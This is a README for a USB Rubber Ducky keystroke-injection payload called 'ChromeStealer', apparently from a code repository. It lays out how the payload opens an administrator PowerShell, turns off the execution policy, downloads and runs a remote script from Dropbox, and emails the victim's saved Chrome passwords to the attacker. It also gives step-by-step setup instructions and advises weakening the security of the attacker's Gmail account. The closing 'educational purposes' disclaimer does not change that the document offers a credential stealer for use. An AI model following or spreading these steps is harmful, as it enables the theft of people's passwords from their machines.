## About:
* Title: RubberDucky-ChromeStealer
* Description: Rubberducky payload that send encrypted chrome passwords to a specified email.
* AUTHOR: Filippo-Carta
* Version: 1.0
* Category: Credentials
* Target: Tested: Windows 10 Untested: Windows 11
* Attackmodes: HID
* Duration: 15/30 seconds

### Workflow:
* Encoding payload and injecting on target's system.
* Open powershell as Administrator.                                        (require Administrator Priviledges)
* Set execution policy as Unrestricted.                                    (require Administrator Priviledges)
* Download and execute powershell file in the Temp folder.
* Set execution policy as Restricted.                                      (require Administrator Priviledges)
* Close Poweshell.

### Usage:
* Complete with your information at line `3`, `4`, and `23` in the `main.ps1` file.
* Upload to `https://www.dropbox.com` the file just modified.
* Copy the link of the `main.ps1` and paste it at line `19` in PAYLOAD.txt.
* Encode the PAYLOAD.txt at `https://payloadstudio.com/community/`.
* Upload it to the rubberducky.

### Tips
* Enable less secure apps and disable 2FA on the gmail account.

### Warning: Potential Misuse of Script

This script is provided solely for educational purposes. It is intended to demonstrate specific programming techniques and concepts. 
Any misuse or application of this script for malicious purposes is strictly prohibited. Users should exercise caution and responsibility 
when utilizing this code. The authors and contributors are not liable for any damage or legal issues that may arise from improper use 
of this script. Always ensure that you have the necessary permissions and legal rights before running scripts on any system or network.

  
